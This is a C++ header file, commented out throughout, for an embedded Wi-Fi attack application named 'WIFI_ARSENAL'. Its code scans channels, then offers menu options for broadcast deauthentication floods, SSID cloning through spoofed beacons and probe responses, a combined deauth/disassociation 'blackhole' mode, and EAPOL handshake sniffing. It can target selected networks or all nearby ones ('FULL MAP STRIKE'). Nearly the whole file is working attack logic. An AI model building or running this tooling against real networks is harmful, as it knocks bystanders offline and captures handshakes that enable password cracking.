// #ifndef APP_WIFI_ARSENAL_H
// #define APP_WIFI_ARSENAL_H

// #include "../src/NanoUI.h"
// #include "wifi_hack_core.h"
// #include "wifi_hack_sniffer.h"
// #include "../packet-injection.h" // 帧构造工具
// #include "../NetManager.h"  

// // const int DEEP_SCAN_CHANNELS[] = {
// //     1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 14, 5, 10,
// //     36, 40, 44, 48, 52, 56, 60, 64, 
// //     100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 
// //     149, 153, 157, 161, 165
// // };
// // const int NUM_DEEP_CHANNELS = sizeof(DEEP_SCAN_CHANNELS) / sizeof(DEEP_SCAN_CHANNELS[0]);

// class AppWifiArsenal : public Application {
// private:
//     enum UIState { STATE_MODE_SEL, STATE_LIVE_RADAR, STATE_MENU, STATE_EXEC };
//     UIState state = STATE_MODE_SEL; 
    
//     int scan_mode = 1; 
//     int radarIndex = 0;  
//     int radarOffset = 0;
//     int menuIndex = 0;
    
//     const char* menuItems[9] = {
//         "1. ATK (Deauth)", "2. ATK (Interfer)", "3. ATK (Blackhole)", 
//         "4. Sniff EAPOL", "5. Sniff Probe", "6. Sniff Beacon", 
//         "7. Sniff Deauth", "8. Sniff Pwn", "9. Sniff ALL"
//     };
    
//     uint32_t lastAttackTick = 0;
//     uint32_t anim_frame = 0; 
// uint32_t currentAttackInterval = 5000; // 5秒安全区，留足时间抓包

//     int scan_channel_idx = 0;
//     uint32_t scan_channel_timer = 0;

//     std::vector<int> targetChannels; 

//     // 直接调用 packet-injection.h 里的 Beacon 和 ProbeResp
//     void inject_spoofed_ap(uint8_t* bssid, const String& ssid, int channel, bool is_probe_resp) {
//         if (is_probe_resp) {
//             wifi_tx_probe_resp_frame(bssid, bssid, ssid.c_str());
//         } else {
//             wifi_tx_beacon_frame(bssid, bssid, ssid.c_str());
//         }
//     }

//     void drawMarqueeText(Canvas* canvas, int x, int y, String text, uint32_t frame) {
//         int max_len = 21; 
//         if ((int)text.length() <= max_len) {
//             canvas->drawText(x, y, text.c_str());
//         } else {
//             int max_scroll = (int)text.length() - max_len;
//             int tick = (frame / 5) % (max_scroll + 20); 
//             int offset = 0;
//             if (tick > 10) offset = tick - 10;
//             if (offset > max_scroll) offset = max_scroll;
//             canvas->drawText(x, y, text.substring(offset, offset + max_len).c_str());
//         }
//     }

//     void setChannel(int ch) {
//         g_hackCtx->currentChannel = ch;
//         wifi_set_channel(ch);
//     }

//     void processHopping() {
//         if (g_hackCtx->isHopping && (hal_get_ticks() - g_hackCtx->lastHopTime >= HOP_INTERVAL)) {
//             if (!targetChannels.empty() && menuIndex != 1) {
//                 g_hackCtx->currentChannelIndex = (g_hackCtx->currentChannelIndex + 1) % targetChannels.size();
//                 setChannel(targetChannels[g_hackCtx->currentChannelIndex]);
//             } else {
//                 g_hackCtx->currentChannelIndex++;
//                 size_t count5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
//                 size_t count2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
                
//                 if (g_hackCtx->use5GHz) {
//                     if ((size_t)g_hackCtx->currentChannelIndex >= count5G) { g_hackCtx->currentChannelIndex = 0; g_hackCtx->use5GHz = false; }
//                     else setChannel(CHANNELS_5GHZ[g_hackCtx->currentChannelIndex]);
//                 } else {
//                     if ((size_t)g_hackCtx->currentChannelIndex >= count2G) { g_hackCtx->currentChannelIndex = 0; g_hackCtx->use5GHz = true; }
//                     else setChannel(CHANNELS_2GHZ[g_hackCtx->currentChannelIndex]);
//                 }
//             }
//             g_hackCtx->lastHopTime = hal_get_ticks();
//         }
//     }

// public:
//     const char* getAppName() override { return "WIFI_ARSENAL"; }
//     AppMode getMode() override { return APP_MODE_EXCLUSIVE; } 

//     void runExclusive(Canvas* canvas, InputDriver* input) override {
//         init_eapol_queue(); 

//         if (!g_hackCtx) g_hackCtx = new WifiHackContext();
        
//         bool running = true;
//         state = STATE_MODE_SEL;
//         scan_mode = 1;
//         char buf[32];
        
//         uint32_t last_ui_draw = 0;

//         while(running && is_display_active) {
//             UIEvent e = input->poll();

//             if (e.type == EVT_BACK) {
//                 if (state == STATE_EXEC || state == STATE_MENU) {
//                     targetChannels.clear();
//                     state = STATE_LIVE_RADAR;
//                 } else if (state == STATE_LIVE_RADAR) {
//                     wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); 
//                     wifi_off(); safe_delay(50);
//                     wifi_on(RTW_MODE_STA); 
//                     state = STATE_MODE_SEL;
//                 } else {
//                     running = false;
//                 }
//             }

//             if (state == STATE_MODE_SEL) {
//                 if (e.type == EVT_DOWN || e.type == EVT_UP) scan_mode = 1 - scan_mode;
//                 if (e.type == EVT_OK) {
//                     wifi_off(); safe_delay(50); wifi_on(RTW_MODE_PROMISC); safe_delay(50);
//                     wifi_enter_promisc_mode();
//                     g_hackCtx->reset();
//                     g_hackCtx->currentMode = SNIFF_ALL; 
//                     wifi_set_promisc(RTW_PROMISC_ENABLE_2, master_promisc_callback, 1);
                    
//                     scan_channel_idx = 0;
//                     setChannel(DEEP_SCAN_CHANNELS[0]);
//                     safe_delay(10);
                    
//                     // 利用武器库发探针
//                     if (scan_mode == 1) {
//                         uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
//                         uint8_t random_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
//                         wifi_tx_probe_resp_frame(random_mac, broadcast, "");
//                     }
//                     scan_channel_timer = hal_get_ticks();
                    
//                     targetChannels.clear();
//                     g_hackCtx->isHopping = false; 
//                     radarIndex = 0; radarOffset = 0;
//                     state = STATE_LIVE_RADAR;
//                 }
//             }
//             else if (state == STATE_LIVE_RADAR) {
//                 if (hal_get_ticks() - scan_channel_timer > 200) {
//                     scan_channel_idx = (scan_channel_idx + 1) % NUM_DEEP_CHANNELS;
//                     setChannel(DEEP_SCAN_CHANNELS[scan_channel_idx]);
//                     if (scan_mode == 1) {
//                         safe_delay(5);
//                         uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
//                         uint8_t random_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
//                         wifi_tx_probe_resp_frame(random_mac, broadcast, "");
//                     }
//                     scan_channel_timer = hal_get_ticks();
//                 }

//                 if (e.type == EVT_DOWN) { 
//                     if ((size_t)radarIndex < g_hackCtx->scanResults.size()) radarIndex++; 
//                     if (radarIndex >= radarOffset + 4) radarOffset = radarIndex - 3; 
//                 }
//                 if (e.type == EVT_UP) { 
//                     if (radarIndex > 0) radarIndex--; 
//                     if (radarIndex < radarOffset) radarOffset = radarIndex; 
//                 }
//                 if (e.type == EVT_OK) { 
//                     if (radarIndex == 0) {
//                         state = STATE_MENU; 
//                     } else {
//                         g_hackCtx->scanResults[radarIndex - 1].selected = !g_hackCtx->scanResults[radarIndex - 1].selected;
//                     }
//                 }
//             } 
//             else if (state == STATE_MENU) {
//                 if (e.type == EVT_DOWN) { if (menuIndex < 8) menuIndex++; } 
//                 if (e.type == EVT_UP) { if (menuIndex > 0) menuIndex--; }
//                 if (e.type == EVT_OK) {
//                     targetChannels.clear();
//                     for (size_t i = 0; i < g_hackCtx->scanResults.size(); i++) {
//                         if (g_hackCtx->scanResults[i].selected) {
//                             bool exists = false;
//                             for (size_t j = 0; j < targetChannels.size(); j++) {
//                                 if (targetChannels[j] == g_hackCtx->scanResults[i].channel) { exists = true; break; }
//                             }
//                             if (!exists) targetChannels.push_back(g_hackCtx->scanResults[i].channel);
//                         }
//                     }

//                     g_hackCtx->txCount = 0; g_hackCtx->rxCount = 0;
//                     g_hackCtx->intelLogs.clear();
                    
//                     if (menuIndex <= 2 && targetChannels.empty()) g_hackCtx->addLog("[SYS] FULL MAP STRIKE!");
//                     else g_hackCtx->addLog("EXECUTING ENGINE...");

//                     if (targetChannels.size() == 1 && menuIndex != 1 && menuIndex != 2) {
//                         g_hackCtx->isHopping = false;
//                         setChannel(targetChannels[0]);
//                     } else g_hackCtx->isHopping = true;

//                     if (menuIndex == 0)      { g_hackCtx->currentMode = SNIFF_EAPOL; g_hackCtx->addLog("[SYS] BARRAGE FIRE!"); }
//                     else if (menuIndex == 1) { g_hackCtx->currentMode = SNIFF_ALL;   g_hackCtx->addLog("[SYS] GHOST CLONING..."); }
//                     else if (menuIndex == 2) { g_hackCtx->currentMode = SNIFF_ALL;   g_hackCtx->addLog("[SYS] BLACKHOLE ACTIVE"); }
//                     else if (menuIndex == 3) { g_hackCtx->currentMode = SNIFF_EAPOL; g_hackCtx->addLog("[SYS] SNIPER MODE (SILENT)"); }
//                     else if (menuIndex == 4) g_hackCtx->currentMode = SNIFF_PROBE;
//                     else if (menuIndex == 5) g_hackCtx->currentMode = SNIFF_BEACON;
//                     else if (menuIndex == 6) g_hackCtx->currentMode = SNIFF_DEAUTH;
//                     else if (menuIndex == 7) g_hackCtx->currentMode = SNIFF_PWNAGOTCHI;
//                     else if (menuIndex == 8) g_hackCtx->currentMode = SNIFF_ALL;
                    
//                     lastAttackTick = hal_get_ticks();
//                     state = STATE_EXEC;
//                 }
//             }
//             else if (state == STATE_EXEC) {
//                 if (menuIndex <= 2) {
//                     if (e.type == EVT_UP && currentAttackInterval > 500) currentAttackInterval -= 100;
//                     if (e.type == EVT_DOWN && currentAttackInterval < 10000) currentAttackInterval += 500;
//                 }

//                 processHopping();

// // 核心攻击逻辑：调用 packet-injection.h
//                 if (menuIndex <= 2 && (hal_get_ticks() - lastAttackTick > currentAttackInterval)) {
//                     bool isMapStrike = targetChannels.empty(); 
//                     for (size_t i = 0; i < g_hackCtx->scanResults.size(); i++) {
//                         WiFiResult &t = g_hackCtx->scanResults[i];
//                         if (isMapStrike || t.selected) { 
//                             if (menuIndex == 0 && t.channel == g_hackCtx->currentChannel) {
// // 只发纯净 Deauth：(Reason 0x02，连发 3 个，间隔 2 毫秒)
//                                 // 没有任何画蛇添足的 Auth Req 干扰路由器！
//                                 wifi_tx_broadcast_deauth(t.bssid, 0x02, 3, 2000); 
//                                 g_hackCtx->txCount += 3; 
//                             }
//                             else if (menuIndex == 1) {
//                                 for(int b=0; b<3; b++) inject_spoofed_ap(t.bssid, t.ssid, g_hackCtx->currentChannel, false);
//                                 inject_spoofed_ap(t.bssid, t.ssid, g_hackCtx->currentChannel, true);
//                                 g_hackCtx->txCount += 4;
//                             }
//                             else if (menuIndex == 2 && t.channel == g_hackCtx->currentChannel) {
//                                 wifi_tx_broadcast_deauth(t.bssid, 1, 4, 1000); 
//                                 wifi_tx_broadcast_disassoc(t.bssid, 8);     
//                                 inject_spoofed_ap(t.bssid, "", g_hackCtx->currentChannel, false);
//                                 g_hackCtx->txCount += 6;
//                             }
//                         }
//                     }
//                     lastAttackTick = hal_get_ticks();
//                 }
//             }

//             if (!g_hackCtx->bleTxQueue.empty()) {
//                 String msgToSend = g_hackCtx->bleTxQueue.front();
//                 g_hackCtx->bleTxQueue.erase(g_hackCtx->bleTxQueue.begin());
//                 #if __has_include("../NetManager.h")
//                 NetManager::safe_ble_notify(msgToSend, NetManager::active_conn_id);
//                 #endif
//             }

//             // 屏幕刷新节流
//             uint32_t ui_throttle_ms = (state == STATE_EXEC) ? (menuIndex == 3 ? 500 : 100) : 30;

//             if (hal_get_ticks() - last_ui_draw > ui_throttle_ms) {
//                 last_ui_draw = hal_get_ticks();
//                 anim_frame++; 
                
//                 canvas->clear();
                
//                 if (state == STATE_MODE_SEL) {
//                     canvas->fillRect(0, 0, 128, 11, C_WHITE);
//                     canvas->drawText(2, 2, "ARSENAL RADAR MODE", 1, true);
//                     if (scan_mode == 0) { canvas->fillRect(0, 24, 128, 11, C_WHITE); canvas->drawText(6, 25, "1. PASSIVE (Stealth)", 1, true); canvas->drawText(6, 38, "2. ACTIVE  (Probe)", 1, false); } 
//                     else { canvas->drawText(6, 25, "1. PASSIVE (Stealth)", 1, false); canvas->fillRect(0, 37, 128, 11, C_WHITE); canvas->drawText(6, 38, "2. ACTIVE  (Probe)", 1, true); }
//                     canvas->drawLine(0, 53, 128, 53, C_WHITE); canvas->drawText(4, 55, "Press OK to Start", 1, false);
//                 }
//                 else if (state == STATE_LIVE_RADAR) {
//                     canvas->fillRect(0, 0, 128, 10, C_WHITE);
//                     snprintf(buf, sizeof(buf), "CH:%03d | APs:%d", g_hackCtx->currentChannel, (int)g_hackCtx->scanResults.size()); canvas->drawText(2, 1, buf, 1, true);
//                     for (int i = 0; i < 4; i++) {
//                         int dataIdx = radarOffset + i; if ((size_t)dataIdx > g_hackCtx->scanResults.size()) break; int y = 14 + (i * 12);
//                         if (dataIdx == 0) {
//                             if (radarIndex == 0) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(10, y, "[ START EXEC ]", 1, true); } 
//                             else canvas->drawText(10, y, "[ START EXEC ]", 1, false);
//                         } else {
//                             WiFiResult &res = g_hackCtx->scanResults[dataIdx - 1]; String msg = String(res.selected ? "[X] " : "[ ] ") + res.ssid.substring(0, 10);
//                             if (radarIndex == dataIdx) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(2, y, msg.c_str(), 1, true); } 
//                             else canvas->drawText(2, y, msg.c_str(), 1, false);
//                             snprintf(buf, sizeof(buf), "%d", res.channel); canvas->drawText(105, y, buf, 1, radarIndex == dataIdx);
//                         }
//                     }
//                     if (g_hackCtx->scanResults.size() > 3) { int barY = map(radarIndex, 0, g_hackCtx->scanResults.size(), 14, 54); canvas->drawLine(126, 14, 126, 56, C_WHITE); canvas->fillRect(125, barY, 3, 3, C_WHITE); }
//                 }
//                 else if (state == STATE_MENU) {
//                     canvas->fillRect(0, 0, 128, 10, C_WHITE); canvas->drawText(2, 1, "SELECT TACTIC", 1, true);
//                     int mOffset = (menuIndex >= 4) ? menuIndex - 3 : 0;
//                     for (int i = 0; i < 4; i++) {
//                         int dIdx = mOffset + i; if (dIdx >= 9) break; int y = 14 + (i * 12);
//                         if (menuIndex == dIdx) { canvas->fillRect(0, y - 1, 128, 11, C_WHITE); canvas->drawText(6, y, menuItems[dIdx], 1, true); } 
//                         else canvas->drawText(6, y, menuItems[dIdx], 1, false);
//                     }
//                     canvas->drawLine(125, 14, 125, 61, C_WHITE); canvas->fillRect(124, 14 + (menuIndex * 40 / 8), 3, 10, C_WHITE);
//                 }
//                 else if (state == STATE_EXEC) {
//                     canvas->fillRect(0, 0, 128, 10, C_WHITE);
//                     String title = String(menuItems[menuIndex]);
//                     if (targetChannels.empty()) title += " [ALL TGT]"; else if (g_hackCtx->isHopping) title += " [HOP:TGT]"; else title += " [CH:" + String(g_hackCtx->currentChannel) + "]";
//                     canvas->drawText(2, 1, title.c_str(), 1, true);
//                     for (size_t i = 0; i < g_hackCtx->intelLogs.size(); i++) drawMarqueeText(canvas, 2, 14 + (i * 10), g_hackCtx->intelLogs[i], anim_frame + i * 15);
//                     canvas->drawLine(0, 43, 128, 43, C_WHITE);
//                     snprintf(buf, sizeof(buf), "Tx:%lu", (unsigned long)g_hackCtx->txCount); canvas->drawText(2, 45, buf);
//                     snprintf(buf, sizeof(buf), "Rx:%lu", (unsigned long)g_hackCtx->rxCount); canvas->drawText(65, 45, buf);
//                     canvas->drawLine(0, 54, 128, 54, C_WHITE);
//                     if (menuIndex <= 2) { snprintf(buf, sizeof(buf), "< BACK [U/D] %lums", (unsigned long)currentAttackInterval); canvas->drawText(2, 56, buf); } 
//                     else canvas->drawText(2, 56, "< BACK:Abort");
//                 }
                
//                 canvas->display(); 
//             }

//             process_raw_eapol_queue(); 
//             yield(); 
//             safe_delay(1); 
//         }
        
//         wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); 
//         wifi_off(); safe_delay(50);
//         wifi_on(RTW_MODE_STA); 
        
//         free_eapol_queue(); 
//     }
// };

// #endif